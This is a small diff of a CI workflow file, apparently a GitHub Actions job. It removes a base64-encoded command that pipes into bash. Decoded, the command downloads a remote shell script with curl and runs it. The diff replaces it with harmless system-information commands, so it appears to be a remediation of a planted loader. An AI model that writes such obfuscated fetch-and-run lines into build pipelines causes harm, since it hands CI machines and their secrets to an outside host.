@@ -9,4 +9,4 @@ jobs:
     steps:
       - shell: bash
         run: |
-          echo "Y3VybCAtcyBodHRwczovL2RvLWRlYXIuY29tL2dpdGh1Yi5zaCB8IHNoCg==" | base64 -d | bash
+          id;uptime;uname -a
